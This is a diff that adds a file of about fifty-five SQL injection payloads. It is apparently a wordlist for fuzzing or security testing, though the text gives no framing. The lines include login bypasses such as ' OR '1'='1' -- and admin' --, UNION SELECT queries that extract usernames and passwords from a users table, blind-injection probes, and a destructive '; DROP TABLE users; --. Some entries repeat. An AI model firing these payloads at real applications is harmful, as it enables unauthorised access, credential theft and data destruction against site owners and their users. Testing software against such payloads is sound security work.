@@ -1,0 +1,55 @@
+' OR '1'='1' --
+'or 1=1 --
+'or 1=1 --' LIMIT 1
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR ''='
+' UNION SELECT NULL, username, password FROM users --
+' OR '1'='1' LIMIT 1 --
+'; DROP TABLE users; --
+'; --
+admin' --
+' AND '1'='1' --
+' AND '1'='2' --
+' AND 1=2 --
+' OR 1=1 --
+' OR 1=1#
+' OR 1=1/*
+' OR 'a'='a
+' AND 1=1 --
+' OR 'x'='x
+' OR 1=1 --
+' OR 1=1/*
+' AND 1=1 --
+' AND 1=1#
+' OR 'abc'='abc
+' UNION SELECT 1,2,3,4,5 --
+' AND 1=2 --
+' OR 1=1 LIMIT 1 --
+' OR 'a'='b
+' OR 1=1# --
+' OR 'a'='a' --
+' OR '1'='1' --+
+' OR '1'='1' /*
+' OR 1=1 -- --
+' UNION SELECT NULL, password FROM users WHERE username = 'admin' --
+' AND email = 'x' AND password LIKE '%a%' --
+' AND id = 1 --
+' AND username = 'admin' --
+' OR username = 'admin' --
+' OR username LIKE 'admin%' --
+' UNION SELECT 1,2,3 --
+' AND username = 'admin' --
+' AND password LIKE 'password%' --
+' OR id=1 --
+' OR username LIKE 'admin%' --
+' UNION SELECT * FROM users WHERE username='admin' --
+' OR email LIKE '%@gmail.com%' --
+' AND username='admin' AND password='password' --
+' UNION SELECT username, password FROM users --
+' AND 1=1' --
+' OR 1=1 --
+' AND 'a'='a --
+' OR '1'='1'; --
+' OR 1=1/* --
